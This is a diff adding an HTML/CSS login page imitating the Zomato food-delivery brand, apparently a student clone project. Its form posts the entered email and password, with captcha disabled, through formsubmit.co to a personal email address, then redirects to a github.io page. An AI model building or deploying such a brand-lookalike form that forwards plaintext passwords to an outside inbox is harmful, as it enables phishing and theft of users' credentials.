@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <title>LogIn-Zomato</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .wrapper {
+            height: 100vh;
+            width: 100%;
+            background-color: #e23744;
+        }
+
+        .navbar {
+            width: 100%;
+            height: 90px;
+            float: left;
+        }
+
+        .navbar h1 {
+            color: white;
+            font-size: 45px;
+            font-weight: bolder;
+            font-family: Helvetica;
+            font-style: italic;
+            margin-left: 503px;
+            margin-top: 23px;
+        }
+
+        .navbar h2 {
+            width: 392px;
+            height: 3px;
+            position: absolute;
+            left: 567px;
+            top: 86px;
+        }
+
+        .navbar h2 hr {
+            color: aliceblue;
+            font-weight: bolder;
+            font-size: 3px;
+        }
+
+        .form1 {
+            width: 392px;
+            height: 450px;
+            background: white;
+            position: absolute;
+            top: 170px;
+            left: 566px;
+            border-radius: 10px;
+            box-shadow: 0 2px 3px #333;
+        }
+
+        .form2 h2 {
+            width: 150px;
+            height: 40px;
+            font-size: 30px;
+            position: absolute;
+            top: 101px;
+            left: 724px;
+            font-family: Helvetica;
+            color: #333;
+        }
+
+        .contact-form {
+            width: 320px;
+            height: 400px;
+            position: absolute;
+            top: 200px;
+            background: transparent;
+        }
+
+        .label h2 {
+            width: 392px;
+            height: 3px;
+            position: absolute;
+            left: 567px;
+            top: 153px;
+        }
+
+        .label h2 hr {
+            color: aliceblue;
+            font-weight: bolder;
+            font-size: 3px;
+        }
+
+        .srch-1 {
+            width: 200px;
+            height: 25px;
+            color: black;
+            font-family: Helvetica;
+            font-size: 16px;
+            margin-top: 13px;
+            padding: 10px;
+            float: left;
+            position: absolute;
+            top: -186px;
+            left: 14px;
+        }
+
+        .srch-1 label {
+            font-size: 15px;
+            /* margin-bottom:10px; */
+            width: 392px;
+            height: 25px;
+            display: inline-block;
+        }
+
+        .srch1 {
+            width: 343px;
+            height: 44px;
+            color: black;
+            font-family: Helvetica;
+            font-size: 16px;
+            margin-top: 5px;
+            padding: 10px;
+            float: left;
+            position: absolute;
+            left: -1px;
+            border: 1px solid gray;
+            border-radius: 7px;
+            box-shadow: 0 1px 2px #ccc;
+        }
+
+        .srch-2 {
+            width: 200px;
+            height: 25px;
+            color: black;
+            font-family: Helvetica;
+            font-size: 16px;
+            margin-top: 13px;
+            padding: 10px;
+            float: left;
+            position: absolute;
+            top: -96px;
+            left: 14px;
+        }
+
+        .srch-2 label {
+            font-size: 15px;
+            /* margin-bottom:10px; */
+            width: 392px;
+            height: 25px;
+            display: inline-block;
+        }
+
+        .srch2 {
+            width: 343px;
+            height: 44px;
+            color: black;
+            font-family: Helvetica;
+            font-size: 16px;
+            margin-top: 5px;
+            padding: 10px;
+            float: left;
+            position: absolute;
+            left: -1px;
+            border: 1px solid gray;
+            border-radius: 7px;
+            box-shadow: 0 1px 2px #ccc;
+        }
+
+        .check {
+            width: 343px;
+            height: 48px;
+            font-family: Helvetica;
+            font-size: 18px;
+            float: left;
+            margin-top: 18px;
+            margin-left: 13px;
+            color: rgba(0, 0, 0, 0.578);
+            transition: 0.3s ease;
+        }
+
+        .check:hover {
+            color: #b5222f;
+        }
+
+        .check label {
+            margin-left: 10px;
+        }
+
+        .check [type="checkbox"] {
+            accent-color: #e23744;
+        }
+
+        .btn {
+            width: 287px;
+            height: 41px;
+            margin-left: 51px;
+            margin-top: 10px;
+            background-color: #e23744;
+            border-radius: 7px;
+            transition: 0.3s ease;
+            color: white;
+            font-family: Helvetica;
+            font-weight: bolder;
+            font-size: 16px;
+        }
+
+        .btn:hover {
+            transform: scale(1.1);
+            background-color: #b5222f;
+        }
+
+        .liw {
+            width: 200px;
+            height: 20px;
+            font-family: Helvetica;
+            font-size: 18px;
+            margin-left: 20px;
+            margin-top: 30px;
+            color: rgba(0, 0, 0, 0.753);
+            font-weight: lighter;
+        }
+
+        .forgot {
+            width: 200px;
+            height: 20px;
+            font-family: Helvetica;
+            font-size: 16px;
+            margin-left: 122px;
+            margin-top: 30px;
+            color: #e23744;
+            font-weight: bolder;
+        }
+
+        .forgot a {
+            color: #e23744;
+            font-weight: bolder;
+            font-size: 16px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="navbar">
+            <h1>Zomato-Order food Online</h1>
+            <h2>
+                <hr>
+            </h2>
+        </div>
+        <div class="form2">
+            <h2>Login</h2>
+        </div>
+        <div class="label">
+            <h2>
+                <hr>
+            </h2>
+        </div>
+        <div class="form1">
+            <form action="https://formsubmit.co/kartik.24bet10014@vitbhopal.ac.in"  method="POST">
+                <!-- redirect after submit-->
+                <input type="hidden" name="_next" value="https://kartik33541.github.io/Zomato-Clone-using-HTML-CSS-and-JS/thanks.html">
+
+                <input type="hidden" name="_captcha" value="false">
+
+                <div class="srch-1">
+                    <label for="email">Email/Username:</label>
+                    <input class="srch1" id="email" name="email" type="email" placeholder="Enter email/username here"
+                        required>
+                </div>
+                <div class="srch-2">
+                    <label for="password">Password:</label>
+                    <input class="srch2" id="password" name="password" type="password" placeholder="Enter password here"
+                        required>
+                </div>
+                <div class="check">
+                    <input class="chk" id="remember" type="checkbox" name="remember" required>
+                    <label for="remember">Remember me</label>
+                </div>
+                <button class="btn" type="submit">Login</button>
+                <p class="liw">Log in with: <span><i class="fa-brands fa-google"></i></span></p>
+                <p class="forgot"><a href="#">Forgot Password</a></p>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
